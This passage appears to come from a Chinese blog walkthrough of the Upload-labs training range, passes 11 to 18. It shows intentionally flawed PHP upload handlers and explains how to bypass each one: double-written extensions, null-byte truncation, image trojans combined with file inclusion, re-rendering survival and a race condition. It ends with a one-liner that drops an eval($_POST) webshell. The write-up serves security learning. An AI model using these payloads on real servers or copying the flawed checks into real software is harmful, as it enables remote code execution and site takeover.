class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现过滤条件会根据黑名单，把我们上传不合格的文件名删掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure>

<p>那么我们可以双写绕过，直接上传<code>1.pphphp</code></p>
<p>成功绕过</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230716123248755.png"></p>
<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察源代码，发现多了一个GET参数<code>save_path</code>，这是我们上传文件的路径</p>
<p>说明我们可以控制我们上传文件的保存路径</p>
<p><code>move_uploaded_file($temp_file,$img_path)</code>是移动文件的函数</p>
<p>我们上传<code>1.php</code>，路径为<code>../upload/</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717122937335.png"></p>
<p>由于对文件后缀有检测</p>
<p>我们抓包修改文件后缀</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717123110735.png"></p>
<p>我们在修改上传路径为<code>../upload/1.php%00</code></p>
<p>因为当程序检测后缀合法后，通过拼接路径和文件名来保存上传的文件</p>
<p>原本的拼接结果为<code>../uploads/1.php%00/9820230717123050.jpg </code></p>
<p>由于截断字符，移动文件的时候会将文件保存为<code>../uploads/1.php</code>，从而达到<code>getshell</code></p>
<p>(这里<code>php</code>版本不满足要求，所以<code>magic_quotes_gpc</code>找不到，也就无法上传成功)</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717123237904.png"></p>
<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和第十二关类似，不过上传路径变为POST传参</p>
<p>先上传<code>1.php</code>，然后抓包修改后缀绕过</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717124359799.png"></p>
<p>然后修改POST参数为<code>../upload/1.phpa</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717124526128.png"></p>
<p>点开Hex，找到我们标记的a，修改为00</p>
<p>因为在Hex中改成00后，得到的结果是一个ASCII码为0的字符，也就是null字符或空字符。</p>
<p>在URL编码中，null字符会被替换为%00，从而达到截断效果</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717124645459.png"></p>
<p>因为<code>php</code>版本问题，和第十二关一样</p>
<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin = fread($file, 2); //只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);    </span><br><span class="line">    $fileType = &#x27;&#x27;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType = &#x27;jpg&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType = &#x27;png&#x27;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType = &#x27;gif&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = &#x27;unknown&#x27;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    if($file_type == &#x27;unknown&#x27;)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析源代码，发现会检查上传文件的开头2个字节</p>
<p>那么我们既要绕过文件后缀名检测，也要绕过文件头检测</p>
<p>我们创建<code>1.php</code>，写入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改后缀为<code>.gif</code></p>
<p>上传抓包，手动添加绕过</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717201028882.png"></p>
<p>题目告诉我们可以结合文件包含漏洞，点开查看源代码</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717201213709.png"></p>
<p>要利用include函数去文件包含，才能解析木马的执行</p>
<p>（上述页面存在文件包含漏洞）</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717201558099.png"></p>
<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法和第十四关相同</p>
<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法和第十四关相同</p>
<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>考点是二次渲染，网站展示的是经过二次渲染后的</p>
<p>我们上传的文件得为<code>.jpg</code>，<code>.png</code>，<code>.gif</code>之一</p>
<p>gif二次渲染容易，我们用准备好的图片马上传，然后下载下来</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717204816066.png"></p>
<p>拉到010里面对比两张图片相同的地方，即未被二次渲染修改</p>
<p>打开比较文件</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717205019287.png"></p>
<p>找到相同地方，说明没被二次渲染</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717205128636.png"></p>
<p>在其中插入一句话木马或<code>getshell</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717205249094.png"></p>
<p>然后再重新上传</p>
<p>发现被重命名了（当然可以抓包看上传成功后的URL，懒得打开bp了）</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717205448299.png"></p>
<p>成功访问有文件包含漏洞的URL</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230717205605438.png"></p>
<h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一下，发现先对我们上传的文件进行白名单检测，然后会对上传文件重命名，如果不符合，<code>unlink()</code>会删除该文件</p>
<p>也就是说如果我们要传图片马绕过，得要有文件包含漏洞。显然这一关没有，那么我们传的图片马就解析不了，那么就只能传一句话木马</p>
<p>我们可以利用条件竞争上传，因为代码执行的过程是需要耗费时间的，我们只要在上传的一句话被删除之前访问就行了</p>
<p>可以利用<strong>burp多线程发包</strong>，然后不断在浏览器访问我们的<code>webshell</code>，会有一瞬间的访问成功。</p>
<p>创建<code>1.php</code>，写入微调后的一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;shell&quot;])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

